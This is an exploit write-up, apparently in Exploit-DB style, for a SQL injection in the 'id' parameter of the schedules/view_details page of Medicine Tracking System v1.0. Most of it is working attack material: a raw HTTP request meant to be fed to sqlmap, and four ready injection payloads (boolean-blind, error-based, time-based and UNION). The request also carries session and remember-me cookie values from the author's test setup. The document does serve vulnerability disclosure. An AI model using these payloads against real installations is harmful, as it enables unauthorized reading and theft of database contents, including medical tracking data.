# Exploit Title: SQLi in Medicine Tracking System Schedule view_details

Vulnerability url: /php-mts/app/?page=schedules/view_details&id=

GET parameter 'id' exists SQL injection vulnerability


### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Medicine Tracking System](https://www.sourcecodester.com/php/16308/medicine-tracker-system-php-oop-and-mysql-db-source-code-free-download.html)
### Version:
> v 1.0


### POC
> Add request below to txt and run python sqlmap.py -r file_name.txt

```
GET /php-mts/app/?page=schedules/view_details&id=6 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: eid=1; remember_me_name=bMGFrQaFzDhuoLmztZCT; remember_me_pwd=YMSm3Q2wFDHaHLQ5eZPKc42oU7CaK8IlA%40q1; remember_me_lang=en; Hm_lvt_c790ac2bdc2f385757ecd0183206108d=1680329430; Hm_lvt_5320b69f4f1caa9328dfada73c8e6a75=1680329567; table-page-size=50; PowerBB_username=xss; PowerBB_password=8879f85d0170cba2a4328bbb5a457c6a; menu_contracted=false; PHPSESSID=e67hpqdmcqi2k65669nv8cagm3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
> Payload:
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=schedules/view_details&id=6' AND 9871=9871 AND 'BvQB'='BvQB

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: page=schedules/view_details&id=6' AND (SELECT 1136 FROM(SELECT COUNT(*),CONCAT(0x7162767671,(SELECT (ELT(1136=1136,1))),0x7170787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'DJGU'='DJGU

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=schedules/view_details&id=6' AND (SELECT 2665 FROM (SELECT(SLEEP(5)))fVOY) AND 'nXjY'='nXjY

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: page=schedules/view_details&id=-3921' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162767671,0x46695869527270724d6d6e6c6549676d7163725870557557646d584465516d6953634b6c77557546,0x7170787871),NULL,NULL,NULL,NULL-- -
```

> POC result with Sqlmap
> 
![Example Image](https://drive.google.com/uc?id=1GhKCQ6VpX8Z4cXmJDrd5u9bbfRVU4qiv)
